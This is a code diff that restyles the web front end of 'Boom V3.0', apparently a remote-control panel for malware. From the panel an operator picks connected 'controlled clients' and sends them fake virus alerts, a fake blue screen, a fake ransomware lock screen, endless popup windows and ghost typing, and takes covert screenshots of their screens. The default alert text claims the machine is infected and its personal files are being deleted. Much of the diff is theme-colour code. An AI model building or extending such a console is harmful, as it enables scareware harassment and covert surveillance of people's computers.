-                    <label class="form-label" style="display:block; margin-bottom:4px; font-weight:bold;">服务器地址</label>
-                    <input class="input" type="text" id="serverInput" placeholder="例如: wss://your-app.up.railway.app/controller" style="margin-bottom:0;">
-                </div>
-                <div style="text-align:left; margin-bottom:12px;">
-                    <label class="form-label" style="display:block; margin-bottom:4px; font-weight:bold;">控制令牌 (Token)</label>
-                    <input class="input" type="password" id="tokenInput" placeholder="请输入 Token" style="margin-bottom:0;">
-                </div>
-                <button class="btn btn-primary" id="loginBtn" onclick="login()">进入控制台</button>
+            <div class="form-group">
+                <label class="form-label">服务器地址</label>
+                <input class="input" type="text" id="serverInput" placeholder="例如: wss://your-app.up.railway.app/controller">
             </div>
+            <div class="form-group">
+                <label class="form-label">控制令牌 (Token)</label>
+                <input class="input" type="password" id="tokenInput" placeholder="请输入 Token">
+            </div>
+            <div id="tokenError" style="color:var(--md-sys-color-error);font-size:13px;margin-bottom:12px;text-align:center;display:none;"></div>
+            <button class="btn btn-filled btn-lg btn-block" id="loginBtn" onclick="login()">进入控制台</button>
         </div>
     </div>
 
+    <!-- ===== 主界面 ===== -->
     <div id="mainScreen" style="display:none;">
-        <div class="page">
-            <div class="brand">
-                <div class="brand-mark">B</div>
-                <div class="brand-copy">
-                    <div class="eyebrow">boom 远控面板</div>
-                    <h1>战术指挥中心</h1>
-                    <div class="subhead">服务端状态监控、在线主机管理以及指令下发集于一处。</div>
+        <header class="app-bar">
+            <div class="app-bar-brand">
+                <div class="app-bar-avatar">B</div>
+                <div>
+                    <div class="app-bar-title">Boom V3.0 控制台</div>
+                    <div class="app-bar-sub">战术指挥中心</div>
                 </div>
             </div>
+            <div class="app-bar-actions">
+                <div class="status-chip" id="appBarStatus">
+                    <span class="status-dot dot-offline" id="appBarDot"></span>
+                    <span id="appBarStatusText">未连接</span>
+                </div>
+                <button class="btn btn-outlined" id="connectBtn" onclick="toggleConnection()">断开连接</button>
+            </div>
+        </header>
 
+        <div class="page">
             <div class="shell">
+                <!-- 左侧栏 -->
                 <div class="left-col">
-                    <div class="panel panel-dark">
-                        <div class="panel-title">服务端状态</div>
-                        <div class="panel-body">
-                            <div class="metric"><span class="metric-label">连接状态</span><span class="metric-value" id="wsStatus"><span class="status-dot dot-offline"></span>已断开</span></div>
-                            <div class="metric"><span class="metric-label">服务地址</span><span class="metric-value" id="wsUrlDisplay">未连接</span></div>
-                            <div class="metric"><span class="metric-label">服务端版本</span><span class="metric-value" id="serverVersion">未知</span></div>
-                            <div class="metric"><span class="metric-label">系统服务</span><span class="metric-value" id="serverService">boom-server</span></div>
-                            <div class="metric"><span class="metric-label">上次检查</span><span class="metric-value" id="versionCheckedAt">从未</span></div>
-                            <div class="metric"><span class="metric-label">在线受控端</span><span class="metric-value connected" id="clientCount">0</span></div>
-                            <button class="btn btn-primary" id="connectBtn" onclick="toggleConnection()">连接服务器</button>
-                            <button class="btn" id="versionBtn" onclick="requestServerStatus()" disabled>检查版本</button>
+                    <!-- 服务端状态 -->
+                    <div class="card card-elevated">
+                        <div class="card-title">服务端状态</div>
+                        <div class="card-body">
+                            <div class="metric">
+                                <span class="metric-label">连接状态</span>
+                                <span class="metric-value disconnected" id="wsStatus"><span class="status-dot dot-offline" style="vertical-align:middle;margin-right:4px;"></span>已断开</span>
+                            </div>
+                            <div class="metric">
+                                <span class="metric-label">服务地址</span>
+                                <span class="metric-value" id="wsUrlDisplay">未连接</span>
+                            </div>
+                            <div class="metric">
+                                <span class="metric-label">服务端版本</span>
+                                <span class="metric-value" id="serverVersion">未知</span>
+                            </div>
+                            <div class="metric">
+                                <span class="metric-label">系统服务</span>
+                                <span class="metric-value" id="serverService">boom-server</span>
+                            </div>
+                            <div class="metric">
+                                <span class="metric-label">上次检查</span>
+                                <span class="metric-value" id="versionCheckedAt">从未</span>
+                            </div>
+                            <div class="metric">
+                                <span class="metric-label">在线受控端</span>
+                                <span class="metric-value connected" id="clientCount">0</span>
+                            </div>
+                            <div style="margin-top:12px;display:flex;gap:8px;">
+                                <button class="btn btn-filled btn-block" id="versionBtn" onclick="requestServerStatus()" disabled>检查版本</button>
+                            </div>
                         </div>
                     </div>
 
-                    <div class="panel config-section" id="configCard">
-                        <div class="panel-title">弹窗自定义参数</div>
-                        <div class="panel-body">
-                            <label class="form-label">弹窗标题</label>
-                            <input class="input" type="text" id="cfgTitle" value="系统警告">
-                            <label class="form-label">警告主文本</label>
-                            <input class="input" type="text" id="cfgText1" value="警告：检测到致命病毒！">
-                            <label class="form-label">警告副文本</label>
-                            <input class="input" type="text" id="cfgText2" value="您的计算机已被感染，正在删除所有个人文件...">
-                            <label class="form-label">按钮文本</label>
-                            <input class="input" type="text" id="cfgBtn" value="立即清理">
-                            <label class="form-label">目标称呼</label>
-                            <input class="input" type="text" id="cfgName" value="目标主机">
-                            <button class="btn btn-primary" onclick="sendConfig()">下发配置</button>
+                    <!-- 主题色选择器 -->
+                    <div class="card">
+                        <div class="card-title">主题色</div>
+                        <div class="card-body">
+                            <div class="theme-picker" id="themePicker">
+                                <div class="theme-swatch active" style="background:#6750a4" data-seed="#6750a4" title="蓝紫"></div>
+                                <div class="theme-swatch" style="background:#4f6bed" data-seed="#4f6bed" title="靛蓝"></div>
+                                <div class="theme-swatch" style="background:#006c4c" data-seed="#006c4c" title="松绿"></div>
+                                <div class="theme-swatch" style="background:#984062" data-seed="#984062" title="玫红"></div>
+                                <div class="theme-swatch" style="background:#8c5e28" data-seed="#8c5e28" title="琥珀"></div>
+                                <div class="theme-swatch" style="background:#005fa3" data-seed="#005fa3" title="海蓝"></div>
+                                <div class="theme-swatch" style="background:#6e5a7d" data-seed="#6e5a7d" title="紫灰"></div>
+                                <div class="theme-swatch" style="background:#b3261e" data-seed="#b3261e" title="砖红"></div>
+                                <div class="theme-swatch-custom" title="自定义">
+                                    <span>+</span>
+                                    <input type="color" id="customColorInput" value="#6750a4">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 客户端列表 -->
+                    <div class="card control-section" id="clientListCard">
+                        <div class="card-title">在线受控端</div>
+                        <div class="card-body">
+                            <div id="clientList"><div class="empty-note">等待客户端接入...</div></div>
+                        </div>
+                    </div>
+
+                    <!-- 配置面板 -->
+                    <div class="card config-section" id="configCard">
+                        <div class="card-title">弹窗自定义参数</div>
+                        <div class="card-body">
+                            <div class="form-group">
+                                <label class="form-label">弹窗标题</label>
+                                <input class="input" type="text" id="cfgTitle" value="系统警告">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">警告主文本</label>
+                                <input class="input" type="text" id="cfgText1" value="警告：检测到致命病毒！">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">警告副文本</label>
+                                <input class="input" type="text" id="cfgText2" value="您的计算机已被感染，正在删除所有个人文件...">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">按钮文本</label>
+                                <input class="input" type="text" id="cfgBtn" value="立即清理">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">目标称呼</label>
+                                <input class="input" type="text" id="cfgName" value="目标主机">
+                            </div>
+                            <button class="btn btn-filled btn-block" onclick="sendConfig()">下发配置</button>
                         </div>
                     </div>
                 </div>
 
+                <!-- 右侧栏 -->
                 <div class="right-col">
-                    <div class="panel control-section" id="clientListCard">
-                        <div class="panel-title">在线受控端</div>
-                        <div class="panel-body">
-                            <div id="clientList"><span class="empty-note">等待客户端接入...</span></div>
+                    <!-- 目标选择 -->
+                    <div class="card control-section" id="controlCard">
+                        <div class="card-body" style="padding-bottom:12px;">
+                            <div class="form-group" style="margin-bottom:0;">
+                                <label class="form-label">目标选择</label>
+                                <select class="input" id="targetSelect"><option value="">全部受控端</option></select>
+                            </div>
                         </div>
                     </div>
 
-                    <div class="panel control-section" id="controlCard">
-                        <div class="panel-title">战术指令下发</div>
-                        <div class="panel-body">
-                            <label class="form-label">目标选择</label>
-                            <select class="input" id="targetSelect"><option value="">全部受控端</option></select>
-                            
-                            <label class="form-label" style="margin-top: 15px;">视觉弹窗系 (Visual Alerts)</label>
-                            <div class="button-grid">
-                                <button class="btn btn-orange" onclick="sendCommand('stage_1')">Stage 1 - 单窗警告</button>
-                                <button class="btn btn-orange" onclick="sendCommand('stage_2')">Stage 2 - 连环弹窗</button>
-                                <button class="btn btn-danger" onclick="sendCommand('stage_force')">强制封锁通告</button>
-                                <button class="btn btn-danger" onclick="sendCommand('prank_infinite_window')">窗口无限繁殖</button>
-                                <div class="clear"></div>
-                            </div>
+                    <!-- Tab 标签页 -->
+                    <div class="tabs control-section" id="commandTabs">
+                        <button class="tab-btn active" data-tab="tab-visual">视觉弹窗</button>
+                        <button class="tab-btn" data-tab="tab-spoof">系统伪装</button>
+                        <button class="tab-btn" data-tab="tab-screen">屏幕特效</button>
+                        <button class="tab-btn" data-tab="tab-physical">物理干扰</button>
+                        <button class="tab-btn" data-tab="tab-monitor">监控与安全</button>
+                    </div>
 
-                            <label class="form-label" style="margin-top: 10px;">系统伪装系 (System Spoofing)</label>
-                            <div class="button-grid">
-                                <button class="btn btn-blue" onclick="sendCommand('stage_3')">Stage 3 - 假蓝屏死机</button>
-                                <button class="btn btn-purple" onclick="sendCommand('stage_4')">Stage 4 - 伪造勒索锁屏</button>
-                                <button class="btn" onclick="sendCommand('prank_fake_update')">伪造系统升级</button>
-                                <button class="btn btn-purple" onclick="sendCommand('prank_glitch')">屏幕故障艺术</button>
-                                <button class="btn btn-purple" onclick="sendCommand('prank_fake_notify')">假系统通知</button>
-                                <div class="clear"></div>
+                    <!-- 视觉弹窗 -->
+                    <div class="tab-panel active control-section" id="tab-visual">
+                        <div class="card">
+                            <div class="card-body">
+                                <div class="section-title">视觉弹窗</div>
+                                <div class="button-grid">
+                                    <button class="btn btn-filled-tonal" onclick="sendCommand('stage_1')">单窗警告</button>
+                                    <button class="btn btn-filled-tonal" onclick="sendCommand('stage_2')">连击弹窗</button>
+                                    <button class="btn btn-error-filled" onclick="sendCommand('stage_force')">强制封锁通告</button>
+                                    <button class="btn btn-error-filled" onclick="sendCommand('prank_infinite_window')">窗口无限繁殖</button>
+                                </div>
                             </div>
+                        </div>
+                    </div>
 
-                            <label class="form-label" style="margin-top: 10px;">物理干扰与整蛊 (Physical & Trolls)</label>
-                            <div class="button-grid">
-                                <button class="btn" onclick="sendCommand('prank_desktop')">窗口随机瞬移</button>
-                                <button class="btn" onclick="sendCommand('prank_flip_screen')">翻转屏幕</button>
-                                <button class="btn" onclick="sendCommand('prank_ghost_typing')">幽灵打字机</button>
-                                <button class="btn btn-orange" onclick="sendCommand('prank_rickroll')">瑞克摇 (Rickroll)</button>
-                                <div class="clear"></div>
+                    <!-- 系统伪装 -->
+                    <div class="tab-panel control-section" id="tab-spoof">
+                        <div class="card">
+                            <div class="card-body">
+                                <div class="section-title">系统伪装</div>
+                                <div class="button-grid">
+                                    <button class="btn btn-filled" onclick="sendCommand('stage_3')">蓝屏死机</button>
+                                    <button class="btn btn-error" onclick="sendCommand('stage_4')">勒索锁屏</button>
+                                    <button class="btn btn-outlined" onclick="sendCommand('prank_fake_update')">假系统更新</button>
+                                    <button class="btn btn-outlined" onclick="sendCommand('prank_fake_notify')">假系统通知</button>
+                                </div>
                             </div>
+                        </div>
+                    </div>
 
-                            <label class="form-label" style="margin-top: 10px;">屏幕截图 (Screen Capture)</label>
-                            <div class="button-grid">
-                                <button class="btn" style="background:#0d7377;background-image:-webkit-linear-gradient(top,#14919b 0%,#0a5d61 100%);background-image:linear-gradient(to bottom,#14919b 0%,#0a5d61 100%);border-color:#074e52;color:#fff;text-shadow:0 -1px 0 rgba(0,0,0,0.35);width:100%;border-left-width:1px;border-right-width:1px;border-radius:10px;" onclick="sendScreenshot()">📸 查看屏幕</button>
-                                <div class="clear"></div>
+                    <!-- 屏幕特效 -->
+                    <div class="tab-panel control-section" id="tab-screen">
+                        <div class="card">
+                            <div class="card-body">
+                                <div class="section-title">屏幕特效</div>
+                                <div class="button-grid">
+                                    <button class="btn btn-filled" onclick="sendCommand('prank_glitch')">屏幕故障艺术</button>
+                                    <button class="btn btn-filled-tonal" onclick="sendCommand('prank_flip_screen')">翻转屏幕</button>
+                                    <button class="btn btn-filled-tonal" onclick="sendCommand('prank_negative')">负片世界</button>
+                                </div>
                             </div>
+                        </div>
+                    </div>
 
-                            <label class="form-label" style="margin-top: 10px;">安全控制 (Safety Controls)</label>
-                            <div class="button-grid">
-                                <button class="btn btn-danger" style="width: 100%; border-left-width: 1px; border-right-width: 1px; border-radius: 10px;" onclick="sendCommand('exit')">一键清除恢复 (Exit)</button>
-                                <div class="clear"></div>
+                    <!-- 物理干扰 -->
+                    <div class="tab-panel control-section" id="tab-physical">
+                        <div class="card">
+                            <div class="card-body">
+                                <div class="section-title">物理干扰</div>
+                                <div class="button-grid">
+                                    <button class="btn btn-outlined" onclick="sendCommand('prank_desktop')">桌面窗口打乱</button>
+                                    <button class="btn btn-outlined" onclick="sendCommand('prank_ghost_typing')">幽灵打字机</button>
+                                    <button class="btn btn-filled-tonal" onclick="sendCommand('prank_rickroll')">瑞克摇</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 监控与安全 -->
+                    <div class="tab-panel control-section" id="tab-monitor">
+                        <div class="card">
+                            <div class="card-body">
+                                <div class="section-title">监控与安全</div>
+                                <div class="button-grid" style="grid-template-columns:1fr;">
+                                    <button class="btn btn-screenshot" onclick="sendScreenshot()">查看屏幕截图</button>
+                                    <button class="btn btn-error-filled" onclick="sendCommand('exit')">一键清除恢复</button>
+                                </div>
                             </div>
                         </div>
                     </div>
                 </div>
-                <div class="clear"></div>
             </div>
         </div>
     </div>
 
+    <!-- ===== 截图弹窗 ===== -->
+    <div id="screenshotModal" class="modal-overlay">
+        <div class="modal-box">
+            <div class="modal-header">
+                <span class="modal-title" id="screenshotTitle">屏幕截图</span>
+                <button class="btn btn-text" onclick="document.getElementById('screenshotModal').classList.remove('active')">关闭</button>
+            </div>
+            <div class="modal-body">
+                <img id="screenshotImage" src="" alt="屏幕截图" />
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== 消息提示 ===== -->
     <div class="msg" id="msg"></div>
 
-    <div id="screenshotModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:9999; justify-content:center; align-items:center;">
-        <div style="background:#1a1a2e; padding:20px; border-radius:8px; max-width:90vw; max-height:90vh;">
-            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
-                <span id="screenshotTitle" style="color:#e0e0e0; font-size:14px;">屏幕截图</span>
-                <button onclick="document.getElementById('screenshotModal').style.display='none'" style="background:#e74c3c; color:white; border:none; padding:4px 12px; border-radius:4px; cursor:pointer;">关闭</button>
-            </div>
-            <img id="screenshotImage" src="" style="max-width:85vw; max-height:80vh; border-radius:4px;" />
-        </div>
-    </div>
-
     <script>
+        /* ================================================================
+           莫奈取色 (Monet) — 纯 JS HSL 色彩数学生成 Material 3 色板
+           ================================================================ */
+        function hexToRgb(hex) {
+            var m = hex.replace(/^#/, "").match(/.{2}/g);
+            if (!m) return {r:0,g:0,b:0};
+            return { r: parseInt(m[0],16), g: parseInt(m[1],16), b: parseInt(m[2],16) };
+        }
+        function rgbToHsl(r,g,b) {
+            r/=255; g/=255; b/=255;
+            var max=Math.max(r,g,b), min=Math.min(r,g,b), h, s, l=(max+min)/2;
+            if (max===min) { h=s=0; }
+            else {
+                var d=max-min;
+                s=l>0.5?d/(2-max-min):d/(max+min);
+                switch(max) {
+                    case r: h=(g-b)/d+(g<b?6:0); break;
+                    case g: h=(b-r)/d+2; break;
+                    case b: h=(r-g)/d+4; break;
+                }
+                h/=6;
+            }
+            return { h: h*360, s: s, l: l };
+        }
+        function hslToRgb(h,s,l) {
+            h/=360;
+            var r,g,b;
+            if (s===0) { r=g=b=l; }
+            else {
+                var hue2rgb=function(p,q,t) {
+                    if(t<0) t+=1; if(t>1) t-=1;
+                    if(t<1/6) return p+(q-p)*6*t;
+                    if(t<1/2) return q;
+                    if(t<2/3) return p+(q-p)*(2/3-t)*6;
+                    return p;
+                };
+                var q=l<0.5?l*(1+s):l+s-l*s;
+                var p=2*l-q;
+                r=hue2rgb(p,q,h+1/3);
+                g=hue2rgb(p,q,h);
+                b=hue2rgb(p,q,h-1/3);
+            }
+            return { r: Math.round(r*255), g: Math.round(g*255), b: Math.round(b*255) };
+        }
+        function toHex(c) {
+            var hex=Math.round(c).toString(16);
+            return hex.length===1?"0"+hex:hex;
+        }
+        function rgbToHex(r,g,b) { return "#"+toHex(r)+toHex(g)+toHex(b); }
+        function hslToHex(h,s,l) { var c=hslToRgb(h,s,l); return rgbToHex(c.r,c.g,c.b); }
+
+        function generatePalette(seedHex) {
+            var rgb = hexToRgb(seedHex);
+            var hsl = rgbToHsl(rgb.r, rgb.g, rgb.b);
+            var H = hsl.h, S = hsl.s, L = hsl.l;
+
+            // 暗色主题 Material 3 色板
+            var p = {
+                primary: hslToHex(H, S, 0.78),
+                onPrimary: hslToHex(H, Math.min(S*0.3, 0.25), 0.12),
+                primaryContainer: hslToHex(H, Math.min(S*0.55, 0.35), 0.30),
+                onPrimaryContainer: hslToHex(H, Math.min(S*0.45, 0.30), 0.92),
+
+                secondary: hslToHex(H + 18, Math.min(S*0.55, 0.25), 0.75),
+                onSecondary: hslToHex(H + 18, Math.min(S*0.25, 0.20), 0.12),
+                secondaryContainer: hslToHex(H + 18, Math.min(S*0.40, 0.25), 0.28),
+                onSecondaryContainer: hslToHex(H + 18, Math.min(S*0.30, 0.22), 0.90),
+
+                tertiary: hslToHex(H + 60, Math.min(S*0.60, 0.30), 0.76),
+                onTertiary: hslToHex(H + 60, Math.min(S*0.25, 0.20), 0.12),
+                tertiaryContainer: hslToHex(H + 60, Math.min(S*0.45, 0.28), 0.30),
+                onTertiaryContainer: hslToHex(H + 60, Math.min(S*0.35, 0.24), 0.90),
+
+                error: "#f2b8b5",
+                onError: "#601410",
+                errorContainer: "#8c1d18",
+                onErrorContainer: "#f9dedc",
+
+                surface: hslToHex(H, Math.min(S*0.08, 0.04), 0.11),
+                onSurface: hslToHex(H, Math.min(S*0.06, 0.03), 0.90),
+                surfaceVariant: hslToHex(H, Math.min(S*0.10, 0.06), 0.28),
+                onSurfaceVariant: hslToHex(H, Math.min(S*0.08, 0.05), 0.78),
+                outline: hslToHex(H, Math.min(S*0.10, 0.06), 0.55),
+                outlineVariant: hslToHex(H, Math.min(S*0.10, 0.06), 0.28),
+                shadow: "#000000",
+                scrim: "#000000",
+
+                inverseSurface: hslToHex(H, Math.min(S*0.06, 0.03), 0.90),
+                inverseOnSurface: hslToHex(H, Math.min(S*0.08, 0.04), 0.12),
+                inversePrimary: hslToHex(H, S, 0.45),
+                surfaceTint: hslToHex(H, Math.min(S*0.45, 0.30), 0.78),
+            };
+
+            // Surface 层级（叠加 primary tint）
+            function mix(a, b, t) {
+                var ca = hexToRgb(a), cb = hexToRgb(b);
+                return rgbToHex(ca.r+(cb.r-ca.r)*t, ca.g+(cb.g-ca.g)*t, ca.b+(cb.b-ca.b)*t);
+            }
+            p.surface1 = mix(p.surface, p.primary, 0.05);
+            p.surface2 = mix(p.surface, p.primary, 0.08);
+            p.surface3 = mix(p.surface, p.primary, 0.11);
+            p.surface4 = mix(p.surface, p.primary, 0.12);
+            p.surface5 = mix(p.surface, p.primary, 0.14);
+
+            // Primary 色调梯度 (0-100)
+            p.primary0 = hslToHex(H, S, 0.00);
+            p.primary10 = hslToHex(H, S, 0.10);
+            p.primary20 = hslToHex(H, S, 0.20);
+            p.primary30 = hslToHex(H, S, 0.30);
+            p.primary40 = hslToHex(H, S, 0.40);
+            p.primary50 = hslToHex(H, S, 0.50);
+            p.primary60 = hslToHex(H, S, 0.60);
+            p.primary70 = hslToHex(H, S, 0.70);
+            p.primary80 = hslToHex(H, S, 0.80);
+            p.primary90 = hslToHex(H, S, 0.90);
+            p.primary95 = hslToHex(H, S, 0.95);
+            p.primary99 = hslToHex(H, S, 0.99);
+            p.primary100 = hslToHex(H, S, 1.00);
+
+            return p;
+        }
+
+        function applyTheme(seedHex) {
+            var p = generatePalette(seedHex);
+            var root = document.documentElement;
+            root.style.setProperty("--md-sys-color-primary", p.primary);
+            root.style.setProperty("--md-sys-color-on-primary", p.onPrimary);
+            root.style.setProperty("--md-sys-color-primary-container", p.primaryContainer);
+            root.style.setProperty("--md-sys-color-on-primary-container", p.onPrimaryContainer);
+            root.style.setProperty("--md-sys-color-secondary", p.secondary);
+            root.style.setProperty("--md-sys-color-on-secondary", p.onSecondary);
+            root.style.setProperty("--md-sys-color-secondary-container", p.secondaryContainer);
+            root.style.setProperty("--md-sys-color-on-secondary-container", p.onSecondaryContainer);
+            root.style.setProperty("--md-sys-color-tertiary", p.tertiary);
+            root.style.setProperty("--md-sys-color-on-tertiary", p.onTertiary);
+            root.style.setProperty("--md-sys-color-tertiary-container", p.tertiaryContainer);
+            root.style.setProperty("--md-sys-color-on-tertiary-container", p.onTertiaryContainer);
+            root.style.setProperty("--md-sys-color-error", p.error);
+            root.style.setProperty("--md-sys-color-on-error", p.onError);
+            root.style.setProperty("--md-sys-color-error-container", p.errorContainer);
+            root.style.setProperty("--md-sys-color-on-error-container", p.onErrorContainer);
+            root.style.setProperty("--md-sys-color-surface", p.surface);
+            root.style.setProperty("--md-sys-color-on-surface", p.onSurface);
+            root.style.setProperty("--md-sys-color-surface-variant", p.surfaceVariant);
+            root.style.setProperty("--md-sys-color-on-surface-variant", p.onSurfaceVariant);
+            root.style.setProperty("--md-sys-color-outline", p.outline);
+            root.style.setProperty("--md-sys-color-outline-variant", p.outlineVariant);
+            root.style.setProperty("--md-sys-color-shadow", p.shadow);
+            root.style.setProperty("--md-sys-color-scrim", p.scrim);
+            root.style.setProperty("--md-sys-color-inverse-surface", p.inverseSurface);
+            root.style.setProperty("--md-sys-color-inverse-on-surface", p.inverseOnSurface);
+            root.style.setProperty("--md-sys-color-inverse-primary", p.inversePrimary);
+            root.style.setProperty("--md-sys-color-surface-tint", p.surfaceTint);
+            root.style.setProperty("--md-sys-color-surface-1", p.surface1);
+            root.style.setProperty("--md-sys-color-surface-2", p.surface2);
+            root.style.setProperty("--md-sys-color-surface-3", p.surface3);
+            root.style.setProperty("--md-sys-color-surface-4", p.surface4);
+            root.style.setProperty("--md-sys-color-surface-5", p.surface5);
+            root.style.setProperty("--md-ref-pal-primary0", p.primary0);
+            root.style.setProperty("--md-ref-pal-primary10", p.primary10);
+            root.style.setProperty("--md-ref-pal-primary20", p.primary20);
+            root.style.setProperty("--md-ref-pal-primary30", p.primary30);
+            root.style.setProperty("--md-ref-pal-primary40", p.primary40);
+            root.style.setProperty("--md-ref-pal-primary50", p.primary50);
+            root.style.setProperty("--md-ref-pal-primary60", p.primary60);
+            root.style.setProperty("--md-ref-pal-primary70", p.primary70);
+            root.style.setProperty("--md-ref-pal-primary80", p.primary80);
+            root.style.setProperty("--md-ref-pal-primary90", p.primary90);
+            root.style.setProperty("--md-ref-pal-primary95", p.primary95);
+            root.style.setProperty("--md-ref-pal-primary99", p.primary99);
+            root.style.setProperty("--md-ref-pal-primary100", p.primary100);
+        }
+
+        // 主题色选择器事件
+        document.addEventListener("DOMContentLoaded", function() {
+            var swatches = document.querySelectorAll(".theme-swatch[data-seed]");
+            var customInput = document.getElementById("customColorInput");
+            swatches.forEach(function(s) {
+                s.addEventListener("click", function() {
+                    swatches.forEach(function(x) { x.classList.remove("active"); });
+                    s.classList.add("active");
+                    applyTheme(s.dataset.seed);
+                    localStorage.setItem("boom_theme_seed", s.dataset.seed);
+                });
+            });
+            if (customInput) {
+                customInput.addEventListener("input", function() {
+                    swatches.forEach(function(x) { x.classList.remove("active"); });
+                    applyTheme(customInput.value);
+                    localStorage.setItem("boom_theme_seed", customInput.value);
+                });
+            }
+            var savedSeed = localStorage.getItem("boom_theme_seed");
+            if (savedSeed) {
+                var matched = false;
+                swatches.forEach(function(s) {
+                    if (s.dataset.seed.toLowerCase() === savedSeed.toLowerCase()) {
+                        s.click();
+                        matched = true;
+                    }
+                });
+                if (!matched && customInput) {
+                    customInput.value = savedSeed;
+                    swatches.forEach(function(x) { x.classList.remove("active"); });
+                    applyTheme(savedSeed);
+                }
+            }
+        });
+
+        /* ================================================================
+           Tab 切换
+           ================================================================ */
+        document.addEventListener("DOMContentLoaded", function() {
+            var tabs = document.querySelectorAll(".tab-btn");
+            tabs.forEach(function(tab) {
+                tab.addEventListener("click", function() {
+                    var targetId = tab.dataset.tab;
+                    tabs.forEach(function(t) { t.classList.remove("active"); });
+                    tab.classList.add("active");
+                    document.querySelectorAll(".tab-panel").forEach(function(p) { p.classList.remove("active"); });
+                    var targetPanel = document.getElementById(targetId);
+                    if (targetPanel) targetPanel.classList.add("active");
+                });
+            });
+        });
+
+        /* ================================================================
+           原有业务逻辑（完整保留）
+           ================================================================ */
         var ws = null;
         var pollTimer = null;
         var token = "";
         var serverUrl = "";
         var clients = [];
+        var selectedClientId = "";
 
         function $(id) { return document.getElementById(id); }
 
@@ -566,18 +1198,18 @@
             var m = $("msg");
             m.innerHTML = escapeHtml(text);
             m.className = isErr ? "msg error show" : "msg show";
-            setTimeout(function() { m.className = "msg"; }, 2000);
+            setTimeout(function() { m.className = "msg"; }, 2500);
         }
 
         function login() {
             serverUrl = $("serverInput").value.replace(/^\s+|\s+$/g, "");
             token = $("tokenInput").value.replace(/^\s+|\s+$/g, "");
-            if (!serverUrl) { showTokenError("Server URL is required"); return; }
-            if (!token) { showTokenError("Token is required"); return; }
-            if (token.length < 8) { showTokenError("Token is too short"); return; }
+            if (!serverUrl) { showTokenError("服务器地址不能为空"); return; }
+            if (!token) { showTokenError("Token 不能为空"); return; }
+            if (token.length < 8) { showTokenError("Token 长度不能少于 8 位"); return; }
             hideTokenError();
             $("loginBtn").disabled = true;
-            $("loginBtn").innerHTML = "Connecting...";
+            $("loginBtn").innerHTML = "连接中...";
             localStorage.setItem("boom_server_url", serverUrl);
             localStorage.setItem("boom_token", token);
             connect();
@@ -585,22 +1217,18 @@
 
         function showTokenError(msg) {
             var errEl = $("tokenError");
-            if (!errEl) {
-                errEl = document.createElement("div");
-                errEl.id = "tokenError";
-                errEl.style.cssText = "color:#8d2822;font-size:13px;margin-top:8px;text-align:center;";
-                $("tokenInput").parentNode.insertBefore(errEl, $("tokenInput").nextSibling);
-            }
+            if (!errEl) return;
+            errEl.style.display = "block";
             errEl.innerHTML = "&#9888; " + escapeHtml(msg);
         }
 
         function hideTokenError() {
             var errEl = $("tokenError");
-            if (errEl) errEl.innerHTML = "";
+            if (errEl) { errEl.innerHTML = ""; errEl.style.display = "none"; }
         }
 
         function safeText(value) {
-            if (value === undefined || value === null || value === "") return "Unknown";
+            if (value === undefined || value === null || value === "") return "未知";
             return String(value);
         }
 
@@ -614,21 +1242,21 @@
         }
 
         function formatTime(value) {
-            if (!value || value === "Unknown") return "Unknown";
+            if (!value || value === "未知") return "未知";
             var d = new Date(value);
             if (isNaN(d.getTime())) return escapeHtml(value);
-            return d.toLocaleString();
+            return d.toLocaleString("zh-CN");
         }
 
         function fieldHtml(label, value) {
-            return '<div class="client-field"><b>' + label + ":</b> " + escapeHtml(value) + "</div>";
+            return '<div class="client-field"><b>' + label + "：</b>" + escapeHtml(value) + "</div>";
         }
 
         function connect() {
             try {
                 var url = serverUrl || $("serverInput").value.replace(/^\s+|\s+$/g, "");
                 if (url.indexOf("ws://") !== 0 && url.indexOf("wss://") !== 0) {
-                    throw new Error("Invalid URL protocol. Must start with ws:// or wss://");
+                    throw new Error("地址协议无效，必须以 ws:// 或 wss:// 开头");
                 }
                 if ($("wsUrlDisplay")) {
                     $("wsUrlDisplay").innerHTML = escapeHtml(url);
@@ -638,7 +1266,10 @@
                     ws.send(JSON.stringify({type: "register", client_id: "web_v2_controller", token: token}));
                 };
                 ws.onmessage = function(e) {
-                    var data = JSON.parse(e.data);
+                    var data;
+                    try { data = JSON.parse(e.data); } catch(ex) { return; }
+                    if (!data || !data.type) return;
+
                     if (data.type === "clients_list") {
                         updateClientList(data.clients);
                     } else if (data.type === "server_status") {
@@ -647,27 +1278,35 @@
                         $("loginScreen").style.display = "none";
                         $("mainScreen").style.display = "block";
                         updateStatus(true);
-                        showMsg("Connected");
+                        showMsg("已连接");
                         requestServerStatus();
                         ws.send(JSON.stringify({type: "list_clients"}));
                         startPoll();
                     } else if (data.type === "error") {
-                        showTokenError(data.message || "Invalid token");
+                        showTokenError(data.message || "Token 无效");
                         $("loginBtn").disabled = false;
-                        $("loginBtn").innerHTML = "Enter console";
+                        $("loginBtn").innerHTML = "进入控制台";
                         ws.close();
                     } else if (data.type === "screenshot") {
                         var modal = document.getElementById('screenshotModal');
                         var img = document.getElementById('screenshotImage');
                         var title = document.getElementById('screenshotTitle');
-                        title.textContent = '屏幕截图 - ' + (data.from || 'Unknown');
+                        title.textContent = '屏幕截图 - ' + (data.from || '未知');
                         if (data.data) {
                             img.src = 'data:image/jpeg;base64,' + data.data;
-                            modal.style.display = 'flex';
+                            modal.classList.add('active');
                         } else {
                             img.src = '';
-                            alert('截图失败：客户端可能未安装 mss 库');
+                            showMsg('截图失败：客户端可能未安装 mss 库', true);
                         }
+                    } else if (data.type === "alert") {
+                        showMsg(data.message || "收到服务器消息", false);
+                    } else if (data.type === "client_offline") {
+                        showMsg("客户端离线: " + escapeHtml(data.client_id || "未知"), true);
+                    } else if (data.type === "pong" || data.type === "ping") {
+                        // 心跳响应，无需处理
+                    } else if (data.type === "control") {
+                        // 控制响应，可选处理
                     }
                 };
                 ws.onclose = function() {
@@ -675,32 +1314,38 @@
                     updateStatus(false);
                     stopPoll();
                     $("loginBtn").disabled = false;
